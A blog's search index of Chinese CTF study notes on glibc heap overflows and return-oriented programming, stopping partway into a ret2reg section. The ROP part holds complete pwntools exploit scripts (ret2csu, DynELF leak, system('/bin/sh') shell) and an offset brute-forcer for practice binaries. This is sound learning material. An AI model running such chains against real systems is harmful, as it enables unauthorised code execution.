<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>堆溢出</title>
    <url>/2020/01/30/%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="堆溢出略写"><a href="#堆溢出略写" class="headerlink" title="堆溢出略写"></a>堆溢出略写</h1><a id="more"></a>

<p>前言：</p>
<p>众所周知堆和栈一点都不一样，但是这也忒不一样了</p>
<p>栈溢出是溢出储存单元</p>
<p>然而堆溢出在我这个垃圾看来应该是从一个申请的堆块溢出到相邻物理地址的新的堆块中去</p>
<p>堆的申请事由低地址向高地址创建的</p>
<h2 id="1-基本策略"><a href="#1-基本策略" class="headerlink" title="1.基本策略"></a>1.基本策略</h2><ol>
<li><p>覆盖与其</p>
<p>物理相邻的下一个 chunk</p>
<p> 的内容。</p>
<ul>
<li>prev_size</li>
<li>size，主要有三个比特位，以及该堆块真正的大小。<ul>
<li>NON_MAIN_ARENA </li>
<li>IS_MAPPED  </li>
<li>PREV_INUSE </li>
<li>the True chunk size</li>
</ul>
</li>
<li>chunk content，从而改变程序固有的执行流。</li>
</ul>
</li>
<li><p>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</p>
</li>
</ol>
<p>注意，前面的pre_sive与size是按照机器字长来计算的，不同的字长长度不同</p>
<h2 id="2-例子"><a href="#2-例子" class="headerlink" title="2.例子"></a>2.例子</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Get input:"</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个程序的主要目的是调用 malloc 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk  的区域并覆盖到其后的 top chunk 之中(实际上 puts 内部会调用 malloc 分配堆内存，覆盖到的可能并不是 top  chunk)。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D;chunk</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;&#x3D;&#x3D;&#x3D;top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>进行写入 ‘A’*100 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D;chunk</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x4141414141414141 &lt;&#x3D;&#x3D;&#x3D;top chunk(已被溢出)</span><br><span class="line">0x602030:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602040:   0x4141414141414141  0x4141414141414141</span><br></pre></td></tr></table></figure>





<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><h3 id="寻找堆分配函数¶"><a href="#寻找堆分配函数¶" class="headerlink" title="寻找堆分配函数¶"></a>寻找堆分配函数<a href="https://wiki.x10sec.org/pwn/heap/heapoverflow_basic/#_5" target="_blank" rel="noopener">¶</a></h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calloc(0x20);</span><br><span class="line">&#x2F;&#x2F;等同于</span><br><span class="line">ptr&#x3D;malloc(0x20);</span><br><span class="line">memset(ptr,0,0x20);</span><br></pre></td></tr></table></figure>

<p> 除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk,*chunk1;</span><br><span class="line">  chunk&#x3D;malloc(16);</span><br><span class="line">  chunk1&#x3D;realloc(chunk,32);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> realloc的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作</p>
<ul>
<li>当realloc(ptr,size)的size不等于ptr的size时<ul>
<li>如果申请size&gt;原来size<ul>
<li>如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li>
<li>如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size) </li>
</ul>
</li>
<li>如果申请size&lt;原来size<ul>
<li>如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li>
<li>如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li>
</ul>
</li>
</ul>
</li>
<li>当realloc(ptr,size)的size等于0时，相当于free(ptr)</li>
<li>当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li>
</ul>
<h3 id="寻找危险函数¶"><a href="#寻找危险函数¶" class="headerlink" title="寻找危险函数¶"></a>寻找危险函数<a href="https://wiki.x10sec.org/pwn/heap/heapoverflow_basic/#_6" target="_blank" rel="noopener">¶</a></h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。</p>
<p>常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h3 id="确定填充长度¶"><a href="#确定填充长度¶" class="headerlink" title="确定填充长度¶"></a>确定填充长度<a href="https://wiki.x10sec.org/pwn/heap/heapoverflow_basic/#_7" target="_blank" rel="noopener">¶</a></h3><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。 一个常见的误区是malloc的参数等于实际分配堆块的大小，但是事实上 ptmalloc  分配出来的大小是对齐的。这个长度一般是字长的2倍，比如32位系统是8个字节，64位系统是16个字节。但是对于不大于2倍字长的请求，malloc会直接返回2倍字长的块也就是最小chunk，比如64位系统执行<code>malloc(0)</code>会返回用户区域为16字节的块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk;</span><br><span class="line">  chunk&#x3D;malloc(0);</span><br><span class="line">  puts(&quot;Get input:&quot;);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;根据系统的位数，malloc会分配8或16字节的用户空间</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>

<p> 注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size=用户区域大小+2*字长</p>
<p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个chunk的prev_size字段储存内容。回头再来看下之前的示例代码 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk;</span><br><span class="line">  chunk&#x3D;malloc(24);</span><br><span class="line">  puts(&quot;Get input:&quot;);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 观察如上代码，我们申请的chunk大小是24个字节。但是我们将其编译为64位可执行程序时，实际上分配的内存会是16个字节而不是24个。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1</span><br></pre></td></tr></table></figure>

<p> 16个字节的空间是如何装得下24个字节的内容呢？答案是借用了下一个块的pre_size域。我们可来看一下用户申请的内存大小与glibc中实际分配的内存大小之间的转换。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* pad request bytes into a usable size -- internal version *&#x2F;</span><br><span class="line">&#x2F;&#x2F;MALLOC_ALIGN_MASK &#x3D; 2 * SIZE_SZ -1</span><br><span class="line">#define request2size(req)                                                      \</span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>

<p>当req=24时，request2size(24)=32。而除去chunk  头部的16个字节。实际上用户可用chunk的字节数为16。而根据我们前面学到的知识可以知道chunk的pre_size仅当它的前一块块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个chunk的prev_size字段，正好24个字节。</p>
<p><strong>实际上 ptmalloc 分配内存是以双字为基本单位，以64位系统为例，分配出来的空间是16的整数倍，即用户申请的chunk都是16字节对齐的。</strong></p>
<p>(注意机器字长的影响)</p>
]]></content>
  </entry>
  <entry>
    <title>堆的数据结构</title>
    <url>/2020/01/20/%E5%A0%86%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="堆的数据结构"><a href="#堆的数据结构" class="headerlink" title="堆的数据结构"></a>堆的数据结构</h1><a id="more"></a>

<p>最近状态不大好，栈溢出也学一阵子了，向堆的方向前进吧</p>
<p>先简单的记录一下知识结构</p>
<h2 id="1-malloc-chunk"><a href="#1-malloc-chunk" class="headerlink" title="1.malloc_chunk"></a>1.malloc_chunk</h2><h2 id="2-chunk"><a href="#2-chunk" class="headerlink" title="2.chunk"></a>2.chunk</h2><h3 id="chunk的数据结构"><a href="#chunk的数据结构" class="headerlink" title="chunk的数据结构"></a>chunk的数据结构</h3><h4 id="1-使用时"><a href="#1-使用时" class="headerlink" title="1.使用时"></a>1.使用时</h4><h4 id="2-空闲时间"><a href="#2-空闲时间" class="headerlink" title="2.空闲时间"></a>2.空闲时间</h4><h2 id="3-bin"><a href="#3-bin" class="headerlink" title="3.bin"></a>3.bin</h2><h3 id="1-fast-bin"><a href="#1-fast-bin" class="headerlink" title="1.fast bin"></a>1.fast bin</h3><h3 id="2-其他的"><a href="#2-其他的" class="headerlink" title="2.其他的"></a>2.其他的</h3><h4 id="2-small-bin"><a href="#2-small-bin" class="headerlink" title="2.small bin"></a>2.small bin</h4><h4 id="3-large-bin"><a href="#3-large-bin" class="headerlink" title="3.large bin"></a>3.large bin</h4><h4 id="4-unsorted-bin"><a href="#4-unsorted-bin" class="headerlink" title="4.unsorted bin"></a>4.unsorted bin</h4><h4 id="4-arena"><a href="#4-arena" class="headerlink" title="4.arena"></a>4.arena</h4><h2 id="5-heap-info"><a href="#5-heap-info" class="headerlink" title="5.heap_info"></a>5.heap_info</h2><h2 id="6-malloc-state"><a href="#6-malloc-state" class="headerlink" title="6.malloc_state"></a>6.malloc_state</h2>]]></content>
  </entry>
  <entry>
    <title>中级ROP</title>
    <url>/2020/01/14/%E4%B8%AD%E7%BA%A7ROP/</url>
    <content><![CDATA[<h1 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h1><a id="more"></a>

<p>64位程序传参</p>
<p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样</p>
<h2 id="ret2-libc-csu-init"><a href="#ret2-libc-csu-init" class="headerlink" title="ret2__libc_csu_init"></a>ret2__libc_csu_init</h2><p>看ctf-wiki</p>
<p>其中一个关于rsp移动的问题，就是payload中有一个 “a” * 0x38的具体解释见如下博客，感谢大佬</p>
<p><a href="https://blog.csdn.net/zszcr/article/details/79833898" target="_blank" rel="noopener">https://blog.csdn.net/zszcr/article/details/79833898</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">level5 = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">sh = process(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">write_got = level5.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = level5.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = level5.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = level5.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span> <span class="comment">#这里的r12 r13 r14 分别为第三 第二 第一个参数</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class="line"><span class="comment">## write(1,write_got,8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">log.success(<span class="string">'execve_addr '</span> + hex(execve_addr))</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read(0,bss_base,16)</span></span><br><span class="line"><span class="comment">## read execve_addr and /bin/sh\x00</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">16</span>, bss_base, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">## execve(bss_base+8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_base, <span class="number">0</span>, <span class="number">0</span>, bss_base + <span class="number">8</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>程序代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>

<p>可以通过不同的地址对不同的寄存器使用</p>
<p>使用不同的gadgets</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x&#x2F;5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061b</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+3</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret </span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061e</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061f</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+9</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<p>2016 XDCTF pwn100</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn-100'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn-100'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_addr = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">pop_rdi = <span class="number">0x400763</span> </span><br><span class="line">gadget_1 = <span class="number">0x40075a</span></span><br><span class="line">gadget_2 = <span class="number">0x400740</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x60107c</span>  <span class="comment">#存储/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    up = <span class="string">''</span>     </span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x48</span></span><br><span class="line">    payload += p64(pop_rdi)         <span class="comment">#这里使用了pop_rdi</span></span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(puts_addr)</span><br><span class="line">    payload += p64(start_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>, <span class="string">'B'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment">#防止未接受完整传回的数据</span></span><br><span class="line">        c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:</span><br><span class="line">            content = content[:<span class="number">-1</span>]+<span class="string">'\x00'</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            content += c</span><br><span class="line">            up = c</span><br><span class="line">    content = content[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=elf)                <span class="comment">#其实可以使用libsearch来搜索system与bin/sh</span></span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="comment">#调用read函数</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget_1)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(gadget_2)</span><br><span class="line">payload += <span class="string">'\x00'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入/bin/sh</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'bye~\n'</span>)</span><br><span class="line">p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system函数</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">72</span>				</span><br><span class="line">payload += p64(pop_rdi)			</span><br><span class="line">payload += p64(bin_sh_addr)		</span><br><span class="line">payload += p64(system_addr)		</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)	</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>1.查看溢出函返回时哪个寄存值指向溢出缓冲区空间</p>
<p>2.然后反编译二进制，查找 call reg 或者jmp reg指令，将 EIP 设置为该指令地址</p>
<p>3.reg所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的</p>
<p>拿一个例题：</p>
<p>HCTF2016的pwn</p>
<p>1.我们先爆破出栈溢出的长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbufferflow_length</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">'WelCome my friend,Do you know password?\n'</span>)</span><br><span class="line">            sh.send(i * <span class="string">'a'</span>)</span><br><span class="line">            output = sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">'No password'</span>):</span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:   <span class="comment">#如果报错，会显示EOFErrot</span></span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>2.爆破我们需要的gadget</p>
